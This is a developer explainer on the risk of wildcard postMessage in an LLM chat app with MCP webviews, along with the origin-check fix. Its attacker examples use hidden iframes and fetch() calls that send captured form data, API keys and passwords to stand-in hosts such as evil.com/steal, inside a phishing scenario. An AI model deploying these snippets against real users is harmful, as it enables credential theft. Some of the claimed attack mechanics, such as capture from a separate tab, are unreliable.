# Understanding the Embedding Attack

## What is "Embedding My Application"?

When we say "embed your application," we mean that **an attacker's website puts your entire app inside an iframe on their malicious site**. This is similar to how YouTube videos can be embedded on other websites.

## Simple Example

### Your Application (Running at `http://localhost:5173`)

```html
<!-- This is YOUR legitimate website -->
<html>
  <head><title>My LLM Chat App</title></head>
  <body>
    <h1>Welcome to My Chat App</h1>
    <!-- Your chat interface with MCP webviews -->
  </body>
</html>
```

### Attacker's Website (Running at `http://evil.com`)

```html
<!-- This is the ATTACKER's malicious website -->
<html>
  <head><title>Free Movie Streaming</title></head>
  <body>
    <h1>Watch Free Movies!</h1>

    <!-- The attacker embeds YOUR app in an invisible iframe -->
    <iframe
      src="http://localhost:5173"
      style="position: absolute; top: -9999px; left: -9999px; width: 1px; height: 1px;">
    </iframe>

    <!-- Attacker's malicious script -->
    <script>
      // Listen for ALL postMessage events
      window.addEventListener('message', function(event) {
        // Receives EVERYTHING your app sends via postMessage!
        console.log('Stolen data:', event.data);

        // Send to attacker's server
        fetch('http://evil.com/steal', {
          method: 'POST',
          body: JSON.stringify(event.data)
        });
      });
    </script>
  </body>
</html>
```

## How the Attack Works (Step-by-Step)

### Step 1: User Visits Attacker's Site
```
User → types "http://evil.com" → lands on attacker's page
```

The attacker's site looks innocent (e.g., "Free Movie Streaming" or "Download Software").

### Step 2: Attacker Embeds Your App (Hidden)
```html
<!-- Your app is loaded inside an invisible iframe -->
<iframe src="http://localhost:5173" style="display: none;"></iframe>
```

Your app is now running on the attacker's page, but the user doesn't see it because it's hidden.

### Step 3: User Uses YOUR App Normally
The user might actually have YOUR app open in another tab. When they interact with webviews:

```javascript
// Inside YOUR webview iframe (on YOUR legitimate site)
window.sendToHost({
  type: 'form-submit',
  formData: {
    apiKey: 'sk-1234567890abcdef',  // Sensitive data!
    email: 'user@example.com',
    password: 'MySecretPass123'
  }
});
```

### Step 4: The OLD CODE Used Wildcard Origin
```javascript
// OLD CODE (VULNERABLE):
window.parent.postMessage(data, '*');
//                              ↑
//                        Sends to ANYONE!
```

The `'*'` wildcard means "send to **any** website that's listening."

### Step 5: Attacker Receives the Data
```javascript
// On evil.com
window.addEventListener('message', function(event) {
  // ✅ Receives the message because '*' allows anyone

  console.log(event.data);
  // Output: {
  //   type: 'form-submit',
  //   formData: {
  //     apiKey: 'sk-1234567890abcdef',  // STOLEN!
  //     email: 'user@example.com',
  //     password: 'MySecretPass123'
  //   }
  // }

  // Attacker now has user's credentials!
});
```

## Real-World Attack Scenario

### Scenario: Phishing via Embedding

1. **Attacker Creates Phishing Site**
   - Domain: `http://anthropic-support.com` (fake)
   - Content: "Your API quota exceeded. Login to resolve."

2. **Attacker Embeds Your App (Hidden)**
   ```html
   <iframe src="http://localhost:5173" style="display:none;"></iframe>
   <script>
     window.addEventListener('message', function(e) {
       fetch('http://real-attacker.com/collect', {
         method: 'POST',
         body: JSON.stringify(e.data)
       });
     });
   </script>
   ```

3. **User Receives Email**
   - "Your MCP app has issues. Click here: http://anthropic-support.com"

4. **User Clicks Link → Opens Phishing Site**
   - Invisible iframe loads your real app
   - JavaScript starts listening for postMessages

5. **User Uses Real App in Another Tab**
   - User goes to REAL app: `http://localhost:5173`
   - Fills out MCP webview form with API key
   - Form sends data via `postMessage(data, '*')`

6. **Phishing Site Steals Data**
   - Even though user is on YOUR real site
   - The malicious site receives ALL postMessages
   - API key stolen!

## The Fix: Specific Origin

### NEW CODE (SECURE):

```javascript
// Specify exact origin instead of wildcard
const PARENT_ORIGIN = 'http://localhost:5173';

window.sendToHost = function(data) {
  window.parent.postMessage(data, PARENT_ORIGIN);
  //                              ↑
  //                     Only send to localhost:5173!
};
```

### Why This Works:

1. **Browser Enforces Origin Check**
   - If attacker tries to receive message, browser blocks it
   - Message only delivered if iframe parent is `http://localhost:5173`

2. **Attacker's Listener Gets Nothing**
   ```javascript
   // On evil.com
   window.addEventListener('message', function(event) {
     // ❌ Never fires! Browser blocks delivery.
   });
   ```

3. **User Protected Even if Site is Embedded**
   - Even if attacker embeds your app
   - postMessage won't deliver to wrong origin
   - Data stays secure

## Validation on Receive Side

We also validate on the RECEIVING side:

```javascript
// In parent window
window.addEventListener('message', function(event) {
  // Check: Is this message from OUR iframe?
  if (event.origin !== window.location.origin) {
    console.warn('Blocked unauthorized message from:', event.origin);
    return;  // Ignore!
  }

  // Safe to process
  handleMessage(event.data);
});
```

### Why Double Check?

- **Defense in depth**: Two layers of protection
- **Catches edge cases**: Malicious iframes you might load
- **Future-proof**: Works even if embedding rules change

## Visual Comparison

### BEFORE (Vulnerable):
```
┌────────────────────────────────────────┐
│  evil.com                              │
│  ┌──────────────────────────────────┐  │
│  │ <iframe src="localhost:5173">    │  │
│  │   Your App                        │  │
│  │   └─→ postMessage(data, '*') ──┐ │  │
│  │                                 │ │  │
│  └─────────────────────────────────┼─┘  │
│                                    │    │
│  <script>                          │    │
│    addEventListener('message') ←───┘    │ ← Attacker receives!
│    sendToAttacker(data)                 │
│  </script>                              │
└────────────────────────────────────────┘
```

### AFTER (Secure):
```
┌────────────────────────────────────────┐
│  evil.com                              │
│  ┌──────────────────────────────────┐  │
│  │ <iframe src="localhost:5173">    │  │
│  │   Your App                        │  │
│  │   └─→ postMessage(data, origin) ─┼──→ Browser: "Wrong origin!"
│  │                                 ╳ │  │     └─→ BLOCKED ❌
│  └─────────────────────────────────┼─┘  │
│                                    ╳    │
│  <script>                          ╳    │
│    addEventListener('message') ←───┘    │ ← Never receives
│  </script>                              │
└────────────────────────────────────────┘
```

## Other Attack Variations

### 1. Browser Extension Attack
An attacker could create a malicious browser extension that:
- Runs on all pages
- Listens for postMessage with `'*'`
- Steals data from any webapp

**Fix prevents this**: Specific origin blocks extension listeners.

### 2. Open Redirect Attack
If your site has an open redirect vulnerability:
```
http://localhost:5173/redirect?url=http://evil.com
```
Attacker redirects user, then embeds old page.

**Fix prevents this**: Even if redirected, postMessage won't leak.

### 3. XSS on Related Subdomain
If `api.localhost:5173` has XSS, attacker might inject script there.

**Fix helps**: Origin check catches subdomain mismatch.

## Why This is Critical

Even with **verified MCPs**, this attack works because:

1. **Attacker doesn't control MCP** - They control the embedding page
2. **MCP server is innocent** - It's just serving legitimate content
3. **User is on real site** - Your legitimate application
4. **No malware needed** - Pure web standards exploit

The vulnerability is in **how messages are broadcast**, not in MCP trust.

## Summary

| Question | Answer |
|----------|--------|
| **What is embedding?** | Putting your entire app inside an iframe on attacker's site |
| **Who does it hurt?** | Your users, even when using verified MCPs |
| **How does it work?** | Attacker listens for postMessage with wildcard `'*'` |
| **What gets stolen?** | ANY data sent via postMessage (forms, credentials, etc.) |
| **Can user see it?** | No - iframe can be invisible |
| **Does user need to visit attacker site?** | Yes, but could be tricked via phishing email |
| **Does closing attacker tab stop it?** | Yes, but damage may be done |
| **Does the fix break functionality?** | No - everything still works normally |

## Testing the Fix

### Before Fix (Test in Browser Console):
```javascript
// On evil.com
window.addEventListener('message', (e) => {
  console.log('Stolen:', e.data);  // ✅ Would receive data
});
```

### After Fix:
```javascript
// On evil.com
window.addEventListener('message', (e) => {
  console.log('Stolen:', e.data);  // ❌ Never fires (blocked)
});
```

---

**Bottom Line**: The embedding attack lets external websites steal your users' data by exploiting wildcard postMessage. The fix (specific origin) prevents this completely while maintaining full functionality.
